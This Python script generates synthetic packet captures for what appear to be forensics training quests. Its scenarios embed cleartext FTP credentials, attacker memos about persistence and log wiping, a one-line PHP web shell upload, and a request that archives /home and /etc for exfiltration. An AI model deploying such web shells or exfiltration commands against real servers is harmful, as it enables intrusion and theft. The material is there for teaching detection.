#!/usr/bin/env python3
"""Generate deterministic evidence pcaps for pentrAIn forensics quests.

No scapy dependency — builds Ethernet/IPv4/TCP frames by hand. Pcaps are
*signposts only*: they leak credentials and drop-paths, never dynamic flag
values (flags are injected post-deploy by the platform).

Usage:
    python scripts/make_capture_pcap.py <scenario> <out.pcap>

Scenarios: wiretap | blackbox | fullreport
Re-run and commit the output — deterministic (fixed timestamps/seq numbers).
"""
from __future__ import annotations

import struct
import sys
from pathlib import Path

CL = "10.10.10.50"   # attacker/client
SRV = "10.10.10.60"  # victim server


def _csum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s += (s >> 16)
    s &= 0xFFFF
    return (~s) & 0xFFFF


def _ip(src: str, dst: str, proto: int, payload: bytes) -> bytes:
    s, d = [bytes(int(o) for o in a.split(".")) for a in (src, dst)]
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), 0x1234,
                      0x4000, 64, proto, 0, s, d)
    return hdr[:10] + struct.pack("!H", _csum(hdr)) + hdr[12:] + payload


def _tcp(src: str, dst: str, sport: int, dport: int, seq: int, ack: int,
         flags: int, payload: bytes) -> bytes:
    s, d = [bytes(int(o) for o in a.split(".")) for a in (src, dst)]
    hdr = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 0x50, flags,
                      8192, 0, 0)
    pseudo = s + d + struct.pack("!BBH", 0, 6, 20 + len(payload))
    chk = _csum(pseudo + hdr + payload)
    hdr = hdr[:16] + struct.pack("!H", chk) + hdr[18:]
    return hdr + payload


def pkt(ts: int, src: str, dst: str, sport: int, dport: int, seq: int,
        ack: int, flags: int, payload: bytes) -> bytes:
    eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
    frame = eth + _ip(src, dst, 6, _tcp(src, dst, sport, dport, seq, ack,
                                        flags, payload))
    return struct.pack("<IIII", ts, 0, len(frame), len(frame)) + frame


def stream(ts: int, sport: int, dport: int, exchanges: list[tuple[int, str, bytes]]
           ) -> list[bytes]:
    """One TCP conversation: handshake + payload exchanges (c->s / s->c)."""
    out = [
        pkt(ts, CL, SRV, sport, dport, 1000, 0, 0x02, b""),          # SYN
        pkt(ts, SRV, CL, dport, sport, 5000, 1001, 0x12, b""),       # SYN/ACK
        pkt(ts, CL, SRV, sport, dport, 1001, 5001, 0x10, b""),       # ACK
    ]
    c_seq, s_seq = 1001, 5001
    for i, (direction, data) in enumerate(exchanges):
        t = ts + 1 + i
        if direction == "s":
            out.append(pkt(t, SRV, CL, dport, sport, s_seq, c_seq, 0x18, data))
            s_seq += len(data)
        else:
            out.append(pkt(t, CL, SRV, sport, dport, c_seq, s_seq, 0x18, data))
            c_seq += len(data)
    out.append(pkt(ts + 1 + len(exchanges), CL, SRV, sport, dport,
                   c_seq, s_seq, 0x11, b""))                          # FIN/ACK
    return out


T0 = 1_700_000_000

SCENARIOS = {
    # for-t1-wiretap: FTP creds in cleartext + manifest revealing the drop dir
    "wiretap": [
        (T0, 40000, 21, [
            (1, b"220 ProFTPD Server (files01) [::ffff:10.10.10.60]\r\n"),
            (0, b"USER ops-backup\r\n"),
            (1, b"331 Password required for ops-backup\r\n"),
            (0, b"PASS Restore2024!\r\n"),
            (1, b"230 User ops-backup logged in\r\n"),
            (0, b"RETR maintenance-manifest.txt\r\n"),
            (1, b"150 Opening BINARY mode data connection (see port 20 stream)\r\n"),
            (0, b"QUIT\r\n"),
        ]),
        (T0 + 4, 20, 40001, [
            (1, b"nightly-maintenance v2\n"
                b"payload staged at: /usr/local/lib/systemd-helper/\n"
                b"persist via: systemd-helper.sh (runs at boot, do not remove)\n"
                b"exfil done - wipe logs when finished\n"),
        ]),
    ],
    # for-t1-exam "Black Box": creds + a different drop path + ssh attempt noise
    "blackbox": [
        (T0, 41000, 21, [
            (1, b"220 ProFTPD Server (archive01)\r\n"),
            (0, b"USER nightops\r\n"),
            (1, b"331 Password required for nightops\r\n"),
            (0, b"PASS NightShift9!\r\n"),
            (1, b"230 User nightops logged in\r\n"),
            (0, b"RETR ops-memo.txt\r\n"),
            (1, b"150 Opening data connection (port 20 stream)\r\n"),
            (0, b"QUIT\r\n"),
        ]),
        (T0 + 4, 20, 41001, [
            (1, b"memo - persistence verified\n"
                b"watcher lives at /var/lib/.fonts-cache/persist.sh\n"
                b"started by /etc/systemd/system/fonts-cache.service\n"
                b"same password works for the nightops ssh account\n"),
        ]),
    ],
    # for-t2-exam "Full Report": HTTP webshell upload + exfil GET
    "fullreport": [
        (T0, 42000, 80, [
            (0, b"POST /upload.php HTTP/1.1\r\nHost: intranet.local\r\n"
                b"Content-Type: multipart/form-data; boundary=x\r\n\r\n"
                b"--x\r\nContent-Disposition: form-data; name=\"f\"; "
                b"filename=\"shell.phtml\"\r\n\r\n"
                b"<?php system($_GET['c']); ?>\r\n--x--\r\n"),
            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 24\r\n\r\n"
                b"uploaded: shell.phtml ok\n"),
        ]),
        (T0 + 6, 42001, 80, [
            (0, b"GET /uploads/shell.phtml?c=tar%20czf%20/var/backups/"
                b"exfil.tar.gz%20/home%20/etc HTTP/1.1\r\nHost: intranet.local"
                b"\r\n\r\n"),
            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"),
            (0, b"GET /var/backups/exfil.tar.gz HTTP/1.1\r\nHost: intranet.local"
                b"\r\n\r\n"),
            (1, b"HTTP/1.1 200 OK\r\nContent-Length: 51\r\n\r\n"
                b"<tar archive - /home and /etc bundled, 4.2M on wire>"),
        ]),
    ],
}


def build(scenario: str) -> bytes:
    out = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    for ts, sport, dport, exchanges in SCENARIOS[scenario]:
        for rec in stream(ts, sport, dport, exchanges):
            out += rec
    return out


def main() -> int:
    if len(sys.argv) != 3 or sys.argv[1] not in SCENARIOS:
        print(__doc__)
        return 2
    out = Path(sys.argv[2])
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_bytes(build(sys.argv[1]))
    print(f"wrote {out} ({out.stat().st_size} bytes, scenario={sys.argv[1]})")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
